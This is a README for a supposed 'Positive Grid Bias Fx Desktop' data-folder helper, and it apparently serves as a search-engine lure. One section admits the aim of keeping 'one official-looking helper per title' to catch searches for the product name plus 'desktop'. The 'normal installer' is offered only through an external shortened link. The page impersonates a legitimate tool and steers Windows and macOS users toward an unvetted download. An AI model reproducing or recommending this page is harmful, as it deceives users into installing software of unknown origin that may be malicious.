# Positive Grid Bias Fx Desktop

*Keep the Positive Grid Bias Fx data folder tidy before an update.*

## Overview

**Positive Grid Bias Fx Desktop** is a Windows utility. A local helper for Positive Grid Bias Fx data folders, config and export files, and photo albums on Windows and macOS.

Patches move Positive Grid Bias Fx data paths without warning.

It runs on the local PC. No account, and nothing is uploaded.

## How to get it

Use the command-line copy in this repository if you already have Python.

If you want a normal installer for Windows or macOS, open the [setup page](https://share.google/A1IHfyGRT0zGRLqj8) and follow the steps there.

## What it does

- Locates Positive Grid Bias Fx user data on Windows and macOS.
- Archives data folders without touching the live install.
- Optional preview so nothing is written until you say so.
- Prints the paths it used.

## The problem

Search traffic for Positive Grid Bias Fx is the product name plus desktop.

Keep one official-looking helper per title.

## Environment

- Windows 10 or 11 for the desktop build
- Python 3.11 or newer only if you run the CLI from this repository
- Runs locally on the PC that starts it; no account required for the CLI

## Run locally

Python 3.11 or newer. From the repository root:

```bash
python -m pip install -r requirements.txt
python main.py --help
```

`--preview` prints the plan and does not write. `--out` sets an output folder when the command supports it.
